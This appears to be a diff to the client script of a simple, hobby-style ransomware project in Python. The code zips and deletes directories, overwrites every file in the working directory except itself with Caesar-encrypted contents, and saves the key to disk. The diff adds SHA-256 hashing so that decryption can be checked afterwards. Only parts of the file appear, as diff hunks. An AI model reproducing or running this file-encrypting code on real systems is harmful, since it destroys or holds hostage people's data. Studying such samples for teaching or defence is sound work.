@@ -1,6 +1,7 @@
 import os
 # import requests
 import shutil
+from hashlib import sha256
 from random import SystemRandom
 
 
@@ -46,16 +47,21 @@ def encrypt():
         for d in dirs:  # Zip all directories so they can be encrypted
             shutil.make_archive(d, 'zip', d)
             shutil.rmtree(d)
+    digest = sha256()
     for filepath in os.listdir(os.getcwd()):
         if (filepath == 'client.py'):   # Don't let the ransomware self-encrypt
             continue
+        with open(filepath, 'rb') as f:
+            digest.update(f.read())
         ciphertext = caesar_encrypt(key, filepath)
         with open(filepath, 'wb') as f:
             f.write(ciphertext)
     with open('key.txt', 'w') as f:
         f.write(str(key))
-    key = None
-    del key
+    with open('hash.txt', 'wb') as f:
+        f.write(digest.digest())
+    key, digest = None, None
+    del key, digest
 
 
 def decrypt():
@@ -64,13 +70,23 @@ def decrypt():
     '''
     with open('key.txt', 'r') as k:
         key = int(k.read())
+    with open('hash.txt', 'rb') as h:
+        sha_hash = h.read()
+    os.remove('key.txt')
+    os.remove('hash.txt')
     for filepath in os.listdir(os.getcwd()):
         if (filepath == 'client.py'):
             continue
         plaintext = caesar_decrypt(key, filepath)
         with open(filepath, 'wb') as f:
             f.write(plaintext)
-
+    digest = sha256()
+    for filepath in os.listdir(os.getcwd()):
+        if (filepath == 'client.py'):
+            continue
+        with open(filepath, 'rb') as f:
+            digest.update(f.read())
+    assert digest.digest() == sha_hash
 
 if __name__ == '__main__':
     # r = requests.get('http://localhost:5000/user/baoijsdf')
